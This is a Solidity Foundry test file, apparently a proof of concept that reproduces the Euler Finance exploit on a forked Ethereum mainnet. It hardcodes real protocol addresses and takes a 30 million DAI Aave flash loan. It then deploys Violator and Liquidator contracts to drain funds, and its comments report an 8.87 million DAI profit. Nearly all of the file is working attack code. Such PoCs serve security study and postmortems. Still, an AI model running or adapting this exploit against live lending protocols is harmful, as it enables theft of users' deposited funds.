// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { Test } from "forge-std/src/Test.sol";
import { console } from "forge-std/src/console.sol";
import { Violator } from "./Violator.sol";
import { Liquidator } from "./Liquidator.sol";
import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { IAaveFlashLoan } from "./interface/IAaveFlashLoan.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { MarketsView } from "./MarketsView.sol";
import { IMarkets } from "./interface/IMarkets.sol";
import { IRiskManager } from "euler-contracts/contracts/IRiskManager.sol";

contract EulerFinancePoC is Test {
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken constant eToken = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    // address eTokenImpl = address(0xeC29b4C2CaCaE5dF1A491f084E5Ec7C62A7EdAb5);
    IMarkets constant MARKETS = IMarkets(0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3);
    IMarkets constant MARKETS_IMPL = IMarkets(0x1E21CAc3eB590a5f5482e1CCe07174DcDb7f7FCe);
    IDToken constant dToken = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    ILiquidation constant LIQUIDATION = ILiquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashLoan constant aaveV2 = IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IRiskManager immutable RISK_MANAGER;
    Violator violator;
    Liquidator liquidator;
    address person = makeAddr("person"); // random address used when checking liquidation status

    function setUp() public {
        vm.createSelectFork("eth", 16817995);
        vm.etch(address(MARKETS_IMPL), address(deployCode('MarketsView.sol')).code);
        vm.label(address(DAI), "DAI");
        vm.label(address(eToken), "eToken");
        vm.label(address(dToken), "dToken");
        vm.label(address(aaveV2), "Aave");
    }

    function testExploit() public {
        console.log("Attacker balance before exploit:", DAI.balanceOf(address(this))/1e18, IERC20(DAI).symbol());
        console.log(" ");
        // 1. Flash loan $30 million DAI
        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
        // setup the flashLoan arguments
        // array of the asset(s) to flashloan
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        // array cointaining the amount(s) of token(s) to flashLoan
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        // modes: the types of debt position to open if the flashloan is not returned.
        // 0: no open debt. (amount + fee must be paid or revert)
        // 1: stable mode debt
        // 2: variable mode debt
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        // params (unused) Arbitrary bytes-encoded params that will be passed to executeOperation() method of the receiver contract.
        bytes memory params =
        abi.encode();
        // documentation on Aave flash loans: https://docs.aave.com/developers/guides/flash-loans
        aaveV2.flashLoan({receiverAddress: address(this), assets: assets, amounts: amounts, modes: modes, onBehalfOf: address(this), params: params, referralCode: 0});

        // 10. attacker's balance > 30 million DAI borrowed + 27k DAI interest => loan repaid successfully automatically (else flashLoan would revert)

        // 8.87 million DAI profit!
        console.log("Attacker balance after exploit:", DAI.balanceOf(address(this)) / 1e18, IERC20(DAI).symbol());
        console.log(" ");
    }

    // executeOperations is the callback function called by flashLoan. Conforms to the following interface: https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        // approve aave to spend DAI
        DAI.approve(address(aaveV2), type(uint256).max);
        // 2. deploy two contracts
        violator = new Violator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS, person);
        liquidator = new Liquidator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS);
        // transfer flash loan to the violator
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.violate();
        liquidator.liquidate(address(violator));
        return true;
    }
}